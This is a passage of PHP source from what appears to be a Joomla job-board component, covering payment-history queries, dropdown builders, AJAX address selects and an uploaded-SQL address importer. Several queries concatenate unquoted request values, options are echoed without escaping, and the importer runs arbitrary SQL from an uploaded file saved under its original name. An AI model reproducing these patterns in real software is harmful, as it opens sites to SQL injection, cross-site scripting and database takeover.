        if ($searchtitle) {
            $query .= $clause . "  payment.packagetitle LIKE " . $db->Quote('%' . $searchtitle . '%', false);
            $clause = " AND ";
        }
        if ($searchprice) {
            $query .= $clause . "payment. packageprice LIKE " . $db->Quote('%' . $searchprice . '%', false);
            $clause = " AND ";
        }
        if ($searchpaymentstatus)
            $query .= $clause . "  payment.transactionverified = " . $searchpaymentstatus;
        $query .= " ORDER BY payment.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $packages = $db->loadObjectList();
        $lists = array();
        $paymentstatus = array(
            '0' => array('value' => '', 'text' => JText::_('JS_SELECT_PAYMENT_STATUS')),
            '1' => array('value' => 1, 'text' => JText::_('JS_VERIFIED')),
            '2' => array('value' => -1, 'text' => JText::_('JS_NOT_VERIFIED')),);


        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchprice)
            $lists['searchprice'] = $searchprice;
        if ($searchpaymentstatus)
            $lists['paymentstatus'] = JHTML::_('select.genericList', $paymentstatus, 'searchpaymentstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchpaymentstatus);
        else
            $lists['paymentstatus'] = JHTML::_('select.genericList', $paymentstatus, 'searchpaymentstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $packages;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getJobseekerPaymentHistory($searchtitle, $searchprice, $searchpaymentstatus, $packagefor, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(payment.id)
				FROM #__js_job_paymenthistory AS payment
				JOIN #__js_job_jobseekerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=" . $packagefor . ")";


        $clause = " WHERE ";
        if ($searchtitle) {
            $query .=$clause . " payment.packagetitle LIKE " . $db->Quote('%' . $searchtitle . '%', false);
            $clause = " AND ";
        }
        if ($searchprice) {
            $query .= $clause . "  payment.packageprice LIKE " . $db->Quote('%' . $searchprice . '%', false);
            $clause = " AND ";
        }
        if ($searchpaymentstatus)
            $query .= $clause . " payment.transactionverified = " . $searchpaymentstatus;

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT payment.*,user.name AS jobseekername,cur.symbol
				  FROM #__js_job_paymenthistory AS payment
				  JOIN #__js_job_jobseekerpackages AS package ON (payment.packageid = package.id AND payment.packagefor=" . $packagefor . ")
				  JOIN #__users AS user ON user.id = payment.uid 
					LEFT JOIN #__js_job_currencies AS cur ON cur.id=payment.currencyid
				  ";

        $clause = "WHERE";
        if ($searchtitle) {
            $query .= $clause . " payment.packagetitle LIKE " . $db->Quote('%' . $searchtitle . '%', false);
            $clause = "AND";
        }
        if ($searchprice) {
            $query .= $clause . "  payment.packageprice LIKE " . $db->Quote('%' . $searchprice . '%', false);
            $clause = "AND";
        }
        if ($searchpaymentstatus)
            $query .= $clause . " payment.transactionverified = " . $searchpaymentstatus;

        $query .= " ORDER BY payment.created DESC";


        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();
        $paymentstatus = array(
            '0' => array('value' => '', 'text' => JText::_('JS_SELECT_PAYMENT_STATUS')),
            '1' => array('value' => 1, 'text' => JText::_('JS_VERIFIED')),
            '2' => array('value' => -1, 'text' => JText::_('JS_NOT_VERIFIED')),);


        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchprice)
            $lists['searchprice'] = $searchprice;

        if ($searchpaymentstatus)
            $lists['paymentstatus'] = JHTML::_('select.genericList', $paymentstatus, 'searchpaymentstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchpaymentstatus);
        else
            $lists['paymentstatus'] = JHTML::_('select.genericList', $paymentstatus, 'searchpaymentstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getEmployerPaymentHistorybyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();


        $query = "SELECT payment.*,package.companiesallow,package.jobsallow,package.featuredcompaines,package.goldcompanies,package.featuredjobs,
				package.goldjobs,package.resumesearch,package.saveresumesearch,package.viewresumeindetails,package.video,package.map,package.featuredcompaniesexpireindays,
				package.goldcompaniesexpireindays,package.featuredjobsexpireindays,package.goldjobsexpireindays,package.shortdetails,package.description,
				package.featuredcompaniesexpireindays,package.goldcompaniesexpireindays,user.name AS employername,
				package.featuredjobsexpireindays,package.goldjobsexpireindays,package.price,package.discount,package.discountstartdate,package.discountenddate,
				package.enforcestoppublishjob,package.enforcestoppublishjobvalue,package.enforcestoppublishjobtype,package.packageexpireindays
				FROM #__js_job_paymenthistory AS payment
				JOIN #__js_job_employerpackages AS package ON payment.packageid = package.id
				JOIN #__users AS user ON user.id = payment.uid ";
        $query .="WHERE  payment.id=" . $c_id;

        $db->setQuery($query);
        $package = $db->loadObject();


        $result[0] = $package;


        return $result;
    }

    function & getJobseekerPaymentHistorybyId($c_id) {
        if (is_numeric($c_id) == false)
            return false;
        $db = & JFactory :: getDBO();
        $query = "SELECT payment.*,payment.payer_itemname2 AS payer_itemname1,package.resumeallow,package.coverlettersallow,package.featuredresume,package.goldresume,package.jobsearch,
				package.savejobsearch,package.applyjobs,package.freaturedresumeexpireindays,package.goldresumeexpireindays,package.video,
				package.shortdetails,package.description,package.price,package.discount,package.discountstartdate,package.discountenddate,
				package.packageexpireindays,user.name AS jobseekername
				FROM #__js_job_paymenthistory AS payment
				JOIN #__js_job_jobseekerpackages AS package ON payment.packageid = package.id
				JOIN #__users AS user ON user.id = payment.uid  ";
        $query .=" WHERE payment.id=" . $c_id;
        $db->setQuery($query);
        $package = $db->loadObject();

        $result[0] = $package;

        return $result;
    }

// Payment Package End
// For Combo Start
    function getCompany($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, name FROM `#__js_job_companies` WHERE status = 1 ORDER BY id ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $companies = array();
        if ($title)
            $companies[] = array('value' => '', 'text' => $title);

        foreach ($rows as $row) {
            $companies[] = array('value' => $row->id, 'text' => $row->name);
        }
        return $companies;
    }

    function getEmployerPackageForCombo($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, title FROM `#__js_job_employerpackages` WHERE status = 1 ORDER BY id ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $packages = array();
        if ($title)
            $packages[] = array('value' => '', 'text' => $title);

        foreach ($rows as $row) {
            $packages[] = array('value' => $row->id, 'text' => $row->title);
        }
        return $packages;
    }

    function getFreeEmployerPackageForCombo($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, title FROM `#__js_job_employerpackages` WHERE status = 1 AND price = 0 ORDER BY id ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $packages = array();
        if ($title)
            $packages[] = array('value' => '', 'text' => $title);

        foreach ($rows as $row) {
            $packages[] = array('value' => $row->id, 'text' => $row->title);
        }
        return $packages;
    }

    function getJobSeekerPackageForCombo($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, title FROM `#__js_job_jobseekerpackages` WHERE status = 1 ORDER BY id ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $packages = array();
        if ($title)
            $packages[] = array('value' => '', 'text' => $title);

        foreach ($rows as $row) {
            $packages[] = array('value' => $row->id, 'text' => $row->title);
        }
        return $packages;
    }

    function getFreeJobSeekerPackageForCombo($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, title FROM `#__js_job_jobseekerpackages` WHERE status = 1 AND price = 0 ORDER BY id ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $packages = array();
        if ($title)
            $packages[] = array('value' => '', 'text' => $title);

        foreach ($rows as $row) {
            $packages[] = array('value' => $row->id, 'text' => $row->title);
        }
        return $packages;
    }

    function getJobType($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, title FROM `#__js_job_jobtypes` WHERE isactive = 1";
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY id ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $this->_jobtype = array();
        if ($title)
            $this->_jobtype[] = array('value' => JText::_(''), 'text' => $title);

        foreach ($rows as $row) {
            $this->_jobtype[] = array('value' => JText::_($row->id),
                'text' => JText::_($row->title));
        }

        return $this->_jobtype;
    }

    function getJobStatus($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, title FROM `#__js_job_jobstatus` WHERE isactive = 1";
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY id ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $this->_jobstatus = array();
        if ($title)
            $this->_jobstatus[] = array('value' => JText::_(''), 'text' => $title);

        foreach ($rows as $row) {
            $this->_jobstatus[] = array('value' => JText::_($row->id), 'text' => JText::_($row->title));
        }
        return $this->_jobstatus;
    }

    function getHeighestEducation($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, title FROM `#__js_job_heighesteducation` WHERE isactive = 1";
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY id ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $this->_heighesteducation = array();
        if ($title)
            $this->_heighesteducation[] = array('value' => JText::_(''), 'text' => $title);

        foreach ($rows as $row) {
            $this->_heighesteducation[] = array('value' => JText::_($row->id), 'text' => JText::_($row->title));
        }
        return $this->_heighesteducation;
    }

    function getShift($title) {
        if (!$this->_shifts) {
            $db = & JFactory::getDBO();
            $query = "SELECT id, title FROM `#__js_job_shifts` WHERE isactive = 1";
            if ($this->_client_auth_key != "")
                $query.=" AND serverid!='' AND serverid!=0";
            $query.= " ORDER BY id ASC ";
            $db->setQuery($query);
            $rows = $db->loadObjectList();
            if ($db->getErrorNum()) {
                echo $db->stderr();
                return false;
            }
            $this->_shifts = array();
            if ($title)
                $this->_shifts[] = array('value' => JText::_(''), 'text' => $title);
            foreach ($rows as $row) {
                $this->_shifts[] = array('value' => JText::_($row->id), 'text' => JText::_($row->title));
            }
        }
        return $this->_shifts;
    }

    function getRoles($rolefor) {
        $db = & JFactory::getDBO();

        if ($rolefor != "")
            $query = "SELECT id, title FROM `#__js_job_roles` WHERE rolefor = " . $rolefor . " AND published = 1 ORDER BY id ASC ";
        else
            $query = "SELECT id, title FROM `#__js_job_roles` WHERE published = 1 ORDER BY id ASC ";

        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $roles = array();
        foreach ($rows as $row) {
            $roles[] = array('value' => $row->id, 'text' => $row->title);
        }
        return $roles;
    }

    function getSalaryRangeTypes($title) {
        $db = & JFactory::getDBO();
        $query = "SELECT id, title FROM `#__js_job_salaryrangetypes` WHERE status = 1";
        if ($this->_client_auth_key != "")
            $query.=" AND serverid!='' AND serverid!=0";
        $query.= " ORDER BY id ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $types = array();
        if ($title)
            $types[] = array('value' => JText::_(''), 'text' => $title);
        foreach ($rows as $row) {
            $types[] = array('value' => $row->id, 'text' => $row->title);
        }
        return $types;
    }

    function getRequiredTravel($title) {
        $requiredtravel = array();
        if ($title)
            $requiredtravel[] = array('value' => '', 'text' => $title);
        $requiredtravel[] = array('value' => 1, 'text' => JText::_('JS_NOT_REQUIRED'));
        $requiredtravel[] = array('value' => 2, 'text' => JText::_('JS_25_PER'));
        $requiredtravel[] = array('value' => 3, 'text' => JText::_('JS_50_PER'));
        $requiredtravel[] = array('value' => 4, 'text' => JText::_('JS_75_PER'));
        $requiredtravel[] = array('value' => 5, 'text' => JText::_('JS_100_PER'));
        return $requiredtravel;
    }

    function getMiniMax($title) {
        $minimax = array();
        if ($title)
            $minimax[] = array('value' => JText::_(''), 'text' => $title);
        $minimax[] = array('value' => 1, 'text' => JText::_('JS_MINIMUM'));
        $minimax[] = array('value' => 2, 'text' => JText::_('JS_MAXIMUM'));

        return $minimax;
    }

    function getCareerLevels($title) {
        if (!$this->_careerlevels) {
            $db = & JFactory::getDBO();
            $query = "SELECT id, title FROM `#__js_job_careerlevels` WHERE status = 1";
            if ($this->_client_auth_key != "")
                $query.=" AND serverid!='' AND serverid!=0";
            $query.=" ORDER BY id ASC ";

            $db->setQuery($query);
            $rows = $db->loadObjectList();
            if ($db->getErrorNum()) {
                echo $db->stderr();
                return false;
            }
            $this->_careerlevels = array();
            if ($title)
                $this->_careerlevels[] = array('value' => JText::_(''), 'text' => $title);
            foreach ($rows as $row) {
                $this->_careerlevels[] = array('value' => $row->id, 'text' => $row->title);
            }
        }
        return $this->_careerlevels;
    }

    function getAges($title) {
        if (!$this->_ages) {// make problem with age from, age to
            $db = & JFactory::getDBO();
            $query = "SELECT id, title FROM `#__js_job_ages` WHERE status = 1";
            if ($this->_client_auth_key != "")
                $query.=" AND serverid!='' AND serverid!=0";
            $query.=" ORDER BY id ASC ";
            $db->setQuery($query);
            $rows = $db->loadObjectList();
            if ($db->getErrorNum()) {
                echo $db->stderr();
                return false;
            }
            $this->_ages = $rows;
        }
        $ages = array();
        if ($title)
            $ages[] = array('value' => JText::_(''), 'text' => $title);
        foreach ($this->_ages as $row) {
            $ages[] = array('value' => $row->id, 'text' => $row->title);
        }
        return $ages;
    }

    function getExperiences($title) {
        if (!$this->_experiences) {
            $db = & JFactory::getDBO();
            $query = "SELECT id, title FROM `#__js_job_experiences` WHERE status = 1";
            if ($this->_client_auth_key != "")
                $query.=" AND serverid!='' AND serverid!=0";
            $query.=" ORDER BY id ASC ";
            $db->setQuery($query);
            $rows = $db->loadObjectList();
            if ($db->getErrorNum()) {
                echo $db->stderr();
                return false;
            }
            $this->_experiences = $rows;
        }

        $experiences = array();
        if ($title)
            $experiences[] = array('value' => JText::_(''), 'text' => $title);
        foreach ($this->_experiences as $row) {
            $experiences[] = array('value' => $row->id, 'text' => $row->title);
        }
        return $experiences;
    }

    function getGender($title) {
        $gender = array();
        if ($title)
            $gender[] = array('value' => '', 'text' => $title);
        $gender[] = array('value' => 1, 'text' => JText::_('JS_MALE'));
        $gender[] = array('value' => 2, 'text' => JText::_('JS_FEMALE'));
        return $gender;
    }

    function getSendEmail() {
        $values = array();
        $values[] = array('value' => 0, 'text' => JText::_('JS_NO'));
        $values[] = array('value' => 1, 'text' => JText::_('JS_YES'));
        $values[] = array('value' => 2, 'text' => JText::_('JS_YES_WITH_RESUME'));
        return $values;
    }

    function getDepartment($uid) {
        if ($uid)
            if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
                return false;
        $db = & JFactory::getDBO();
        $query = "SELECT id, name FROM `#__js_job_departments` WHERE uid = " . $uid . " AND status = 1  ORDER BY name ASC ";
        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }
        $departments = array();
        foreach ($rows as $row) {
            $departments[] = array('value' => JText::_($row->id),
                'text' => JText::_($row->name));
        }
        return $departments;
    }

// Get Combo End
// Ajax Start
    function &listSearchAddressData($data, $val) {
        $db = &$this->getDBO();

        if ($data == 'country') {  // country
            $query = "SELECT id AS code, name FROM `#__js_job_countries` WHERE enabled = 'Y' ORDER BY name ASC";
            $db->setQuery($query);
            $result = $db->loadObjectList();

            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' name='country' size='40' maxlength='100'  />";
            } else {
                $return_value = "<select name='country' class='inputbox' onChange=\"dochange('state', this.value)\">\n";
                $return_value .= "<option value=''>" . JText::_('JS_SEARCH_ALL') . "</option>\n";

                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->code\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        } else if ($data == 'state') {  // states
            $query = "SELECT id AS code, name from `#__js_job_states` WHERE enabled = 'Y' AND countryid= '$val' ORDER BY name ASC";
            $db->setQuery($query);
            $result = $db->loadObjectList();
            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' name='state' size='40' maxlength='100'  />";
            } else {
                $return_value = "<select name='state' class='inputbox' onChange=\"dochange('city', this.value)\">\n";
                $return_value .= "<option value=''>" . JText::_('JS_SEARCH_ALL') . "</option>\n";

                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->code\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        } else if ($data == 'city') { // city
            $query = "SELECT id AS code, name from `#__js_job_cities` WHERE enabled = 'Y' AND stateid= '$val' ORDER BY 'name'";
            $db->setQuery($query);
            $result = $db->loadObjectList();
            if (empty($result)) {
                $return_value = "<input class='inputbox' type='text' name='city' size='40' maxlength='100'  />";
            } else {
                $return_value = "<select name='city' class='inputbox' onChange=\"dochange('zipcode', this.value)\">\n";
                $return_value .= "<option value=''>" . JText::_('JS_SEARCH_ALL') . "</option>\n";


                foreach ($result as $row) {
                    $return_value .= "<option value=\"$row->code\" >$row->name</option> \n";
                }
                $return_value .= "</select>\n";
            }
        }
        return $return_value;
    }

    function &listDepartments($val) {
        $db = &$this->getDBO();

        $query = "SELECT id, name FROM `#__js_job_departments` WHERE status = 1 AND companyid = " . $val . "
				ORDER BY name ASC";
        $db->setQuery($query);
        $result = $db->loadObjectList();

        if (isset($result)) {
            $return_value = "<select name='departmentid' class='inputbox' >\n";

            foreach ($result as $row) {
                $return_value .= "<option value=\"$row->id\" >$row->name</option> \n";
            }
            $return_value .= "</select>\n";
        }

        return $return_value;
    }

    function &listSubCategories($val) {
        $db = &$this->getDBO();

        $query = "SELECT id, title FROM `#__js_job_subcategories` WHERE status = 1 AND categoryid = " . $val . " ORDER BY title ASC";
        $db->setQuery($query);
        $result = $db->loadObjectList();

        if (isset($result)) {
            $return_value = "<select name='subcategoryid' class='inputbox' >\n";
            $return_value .= "<option value='' >" . JText::_('JS_SUB_CATEGORY') . "</option> \n";
            foreach ($result as $row) {
                $return_value .= "<option value=\"$row->id\" >$row->title</option> \n";
            }
            $return_value .= "</select>\n";
        }
        return $return_value;
    }

    function &listSubCategoriesForSearch($val) {
        $db = &$this->getDBO();

        $query = "SELECT id, title FROM `#__js_job_subcategories` WHERE status = 1 AND categoryid = " . $val . " ORDER BY title ASC";
        $db->setQuery($query);
        $result = $db->loadObjectList();

        if (isset($result)) {
            $return_value = "<select name='jobsubcategory' class='inputbox' >\n";
            $return_value .= "<option value='' >" . JText::_('JS_SUB_CATEGORY') . "</option> \n";
            foreach ($result as $row) {
                $return_value .= "<option value=\"$row->id\" >$row->title</option> \n";
            }
            $return_value .= "</select>\n";
        }
        return $return_value;
    }

// Ajax End
    function loadAddressData() {
        $db = & JFactory::getDBO();
        $data = JRequest :: get('post');
        $str = JPATH_BASE;
        $base = substr($str, 0, strlen($str) - 14); //remove administrator
        $returncode = 1;
        if ($_FILES['loadaddressdata']['size'] > 0) {
            $file_name = $_FILES['loadaddressdata']['name']; // file name
            $file_tmp = $_FILES['loadaddressdata']['tmp_name']; // actual location
            $file_size = $_FILES['loadaddressdata']['size']; // file size
            $file_type = $_FILES['loadaddressdata']['type']; // mime type of file determined by php
            $file_error = $_FILES['loadaddressdata']['error']; // any error!. get reason here
            if (!empty($file_tmp)) { // only MS office and text file is accepted.
                $ext = $this->getExtension($file_name);
                if (($ext != "zip") && ($ext != "sql"))
                    return 3; //file type mistmathc
            }
            $path = $base . '/components/com_jsjobs/data';
            if (!file_exists($path)) { // creating data directory
                $this->makeDir($path);
            }
            $path = $base . '/components/com_jsjobs/data/temp';
            if (!file_exists($path)) { // creating temp directory
                $this->makeDir($path);
            }
            $comp_filename = $path . '/' . $file_name;
            move_uploaded_file($file_tmp, $path . '/' . $file_name);
            if ($ext == 'zip') {
                require_once 'components/com_jsjobs/include/lib/pclzip.lib.php';
                $archive = new PclZip($comp_filename);
                $list = $archive->listContent();
                if ($archive->extract(PCLZIP_OPT_PATH, $path) == 0) {
                    die("Error : " . $archive->errorInfo(true));
                }
                $comp_filename = $path . '/' . $list[0]['filename'];
            }
            $filestring = file_get_contents($comp_filename);
            $resultstates = strpos($filestring, '#__js_job_states');
            $resultcities = strpos($filestring, '#__js_job_cities');
            if (($resultstates) || ($resultcities)) {
                $queries = $db->splitSql($filestring);
                $queries = array_filter($queries);
                $queries = array_map('trim', $queries);
                $totalnumberofqueries = count($queries) - 1;
                $percentageperquery = round(100 / $totalnumberofqueries, 1);
                $perquery = 0;
                $option = $_POST['datakept'];
                $fileowner = $_POST['fileowner'];
                $datacontain = $_POST['datacontain'];
                echo "<style type=\"text/css\">
                            div#progressbar{display:block;width:275px;height:20px;position:relative;padding:2px;border:1px solid #E0E1E0;}
                            span#backgroundtext{position:absolute;width:275px;height:20px;top:0px;left:0px;text-align:center;}
                            span#backgroundcolour{display:block;height:20px;background:#D8E8ED;width:1%;}
                            h1{color:1A5E80;}
                        </style>";
                echo str_pad('<html><h1>' . JText::_('ADDRESS_DATA_UPDATING') . '</h1><div id="progressbar"><span id="backgroundtext">0% complete.</span><span id="backgroundcolour" style="width:1%;"></span></div></html>', 5120);
                echo str_pad(JText::_('LOADING'), 5120) . "<br />\n";
                flush();
                ob_flush();

                if ($option == 1) {// kept data
                    $city_insert = 0;
                    $state_insert = 0;
                    echo str_pad(JText::_('BACKUP'), 5120) . "<br />\n";
                    flush();
                    ob_flush();

                    if ($fileowner == 1) { // myfile
                    } elseif ($fileowner == 2) { // joomsky file
                        if ($datacontain == 1) { // states
                            $state_insert = 1;
                        } elseif ($datacontain == 2) { // cities
                            $city_insert = 1;
                        } elseif ($datacontain == 3) { // states and cities
                            $city_insert = 1;
                            $state_insert = 1;
                        }
                    }
                    if ($city_insert == 1) {
                        $drop_city = "DROP TABLE IF EXISTS `#__js_job_cities_new`";
                        $db->setQuery($drop_city);
                        $db->query();
                        $create_cities = " CREATE TABLE `#__js_job_cities_new` (
							  `id` mediumint(6) NOT NULL AUTO_INCREMENT,
							  `cityName` varchar(70) DEFAULT NULL,
							  `name` varchar(60) DEFAULT NULL,
							  `stateid` smallint(8) DEFAULT NULL,
							  `countryid` smallint(9) DEFAULT NULL,
							  `isedit` tinyint(1) DEFAULT '0',
							  `enabled` tinyint(1) NOT NULL DEFAULT '0',
							  `serverid` int(11) DEFAULT NULL,
							  PRIMARY KEY (`id`),
							  KEY `countryid` (`countryid`),
							  KEY `stateid` (`stateid`),
							  FULLTEXT KEY `name` (`name`)
							) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='utf8_general_ci'";
                        $db->setQuery($create_cities);
                        $db->query();

                        $query = "INSERT INTO `#__js_job_cities_new`(id,cityName,name,stateid,countryid,isedit,enabled,serverid)
							SELECT city.id AS id,city.cityName AS cityName,city.name AS name,city.stateid AS stateid,city.countryid AS countryid,city.isedit AS isedit,city.enabled AS enabled,city.serverid AS serverid 
							FROM `#__js_job_cities` AS city";
                        $db->setQuery($query);
                        $db->query();
                    }
                    if ($state_insert == 1) {
                        $drop_state = "DROP TABLE IF EXISTS `#__js_job_states_new`";
                        $db->setQuery($drop_state);
                        $db->query();
                        $create_state = "CREATE TABLE `#__js_job_states_new` (
						  `id` smallint(8) NOT NULL AUTO_INCREMENT,
						  `name` varchar(35) DEFAULT NULL,
						  `shortRegion` varchar(25) DEFAULT NULL,
						  `countryid` smallint(9) DEFAULT NULL,
						  `enabled` tinyint(1) NOT NULL DEFAULT '0',
						  `serverid` int(11) DEFAULT NULL,
						  PRIMARY KEY (`id`),
						  KEY `countryid` (`countryid`),
						  FULLTEXT KEY `name` (`name`)
						) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='utf8_general_ci'";
                        $db->setQuery($create_state);
                        $db->query();
                        $query = "INSERT INTO `#__js_job_states_new`(id,name,shortRegion,countryid,enabled,serverid)
							SELECT state.id AS id,state.name AS name,state.shortRegion AS shortRegion,state.countryid AS countryid,state.enabled AS enabled,state.serverid AS serverid 
							FROM `#__js_job_states` AS state
							";
                        $db->setQuery($query);
                        $db->query();
                    }
                } elseif ($option == 2) {// Discard old data;
                    $discaed_city = 0;
                    $discaed_state = 0;
                    echo str_pad(JText::_('DELETE'), 5120) . "<br />\n";
                    flush();
                    ob_flush();
                    if ($fileowner == 1) { // myfile
                        $discaed_city = 1;
                        $discaed_state = 1;
                    } elseif ($fileowner == 2) { // joomsky file
                        if ($datacontain == 1) { // states
                            $discaed_state = 1;
                        } elseif ($datacontain == 2) { // cities
                            $discaed_city = 1;
                        } elseif ($datacontain == 3) { // states and cities
                            $discaed_city = 1;
                            $discaed_state = 1;
                        }
                    }
                    if ($discaed_city == 1) {
                        $drop_city = "DROP TABLE IF EXISTS `#__js_job_cities_new`";
                        $db->setQuery($drop_city);
                        $db->query();
                        $create_cities = " CREATE TABLE `#__js_job_cities_new` (
							  `id` mediumint(6) NOT NULL AUTO_INCREMENT,
							  `cityName` varchar(70) DEFAULT NULL,
							  `name` varchar(60) DEFAULT NULL,
							  `stateid` smallint(8) DEFAULT NULL,
							  `countryid` smallint(9) DEFAULT NULL,
							  `isedit` tinyint(1) DEFAULT '0',
							  `enabled` tinyint(1) NOT NULL DEFAULT '0',
							  `serverid` int(11) DEFAULT NULL,
							  PRIMARY KEY (`id`),
							  KEY `countryid` (`countryid`),
							  KEY `stateid` (`stateid`),
							  FULLTEXT KEY `name` (`name`)
							) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='utf8_general_ci'";
                        $db->setQuery($create_cities);
                        $db->query();
                        $q = "DELETE FROM `#__js_job_cities`";
                        $db->setQuery($q);
                        $db->query();
                    }
                    if ($discaed_state == 1) {
                        $drop_state = "DROP TABLE IF EXISTS `#__js_job_states_new`";
                        $db->setQuery($drop_state);
                        $db->query();
                        $create_state = "CREATE TABLE `#__js_job_states_new` (
						  `id` smallint(8) NOT NULL AUTO_INCREMENT,
						  `name` varchar(35) DEFAULT NULL,
						  `shortRegion` varchar(25) DEFAULT NULL,
						  `countryid` smallint(9) DEFAULT NULL,
						  `enabled` tinyint(1) NOT NULL DEFAULT '0',
						  `serverid` int(11) DEFAULT NULL,
						  PRIMARY KEY (`id`),
						  KEY `countryid` (`countryid`),
						  FULLTEXT KEY `name` (`name`)
						) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='utf8_general_ci'";
                        $db->setQuery($create_state);
                        $db->query();
                        $q = "DELETE FROM `#__js_job_states`";
                        $db->setQuery($q);
                        $db->query();
                    }
                }
                echo str_pad(JText::_('IMPORTING_NEW_DATA'), 5120) . "<br />\n";
                flush();
                ob_flush();
                foreach ($queries AS $query) {
                    if (!empty($query)) {
                        $db->setQuery($query);
                        $db->query();
                    }
                    $perquery += $percentageperquery;
                    //This div will show loading percents
                    echo str_pad('<script type="text/javascript">document.getElementById("backgroundcolour").style.width = "' . $perquery . '%";</script>', 50120);
                    echo str_pad('<script type="text/javascript">document.getElementById("backgroundtext").innerHTML = "' . $perquery . '% complete.";</script>', 50120);
                    flush();
                    ob_flush();
                }
                if ($option == 1) {// kept data
                    if ($city_insert == 1) {
                        $removeduplicationofcities = $this->correctCityData();
                        if ($removeduplicationofcities == 0)
                            return 0;
                        $q = "DROP TABLE `#__js_job_cities_new`";
                        $db->setQuery($q);
                        $db->query();
                    }
                    if ($state_insert == 1) {
                        $removeduplicationofstates = $this->correctStateData();
                        if ($removeduplicationofstates == 0)
                            return 0;
                        $q = "DROP TABLE `#__js_job_states_new`";
                        $db->setQuery($q);
                        $db->query();
                    }
                }elseif($option == 2){ // discard data
                    if($discaed_city == 1){
                        $query = "INSERT INTO `#__js_job_cities`(id,cityName,name,stateid,countryid,isedit,enabled,serverid)
                                    SELECT city.id AS id,city.cityName AS cityName,city.name AS name,city.stateid AS stateid,city.countryid AS countryid,city.isedit AS isedit,city.enabled AS enabled,city.serverid AS serverid 
                                    FROM `#__js_job_cities_new` AS city ";
                        $db->setQuery($query);
                        $db->query();
                        $query = "DROP TABLE `#__js_job_cities_new`";
                        $db->setQuery($query);
                        $db->query();
                        
                    }
                    
                    if($discaed_state == 1){
                        $query = "INSERT INTO `#__js_job_states`(id,name,shortRegion,countryid,enabled,serverid)
                                    SELECT state.id AS id,state.name AS name,state.shortRegion AS shortRegion,state.countryid AS countryid,state.enabled AS enabled,state.serverid AS serverid 
                                    FROM `#__js_job_states_new` AS state ";
                        $db->setQuery($query);
                        $db->query();
                        $query = "DROP TABLE `#__js_job_states_new`";
                        $db->setQuery($query);
                        $db->query();
                    }
                    
                }
                $perquery = 100;
                //This div will show loading percents
                echo str_pad('<script type="text/javascript">document.getElementById("backgroundcolour").style.width = "' . $perquery . '%";</script>', 50120);
                echo str_pad('<script type="text/javascript">document.getElementById("backgroundtext").innerHTML = "' . $perquery . '% complete.";</script>', 50120);
                flush();
                ob_flush();

                echo str_pad(JText::_('REDIRECTING'), 5120) . "<br />\n";
                flush();
                ob_flush();
                return 1;
            }
        }
        return 0; //return 0 if any error occured
    }

    function correctCityData() {
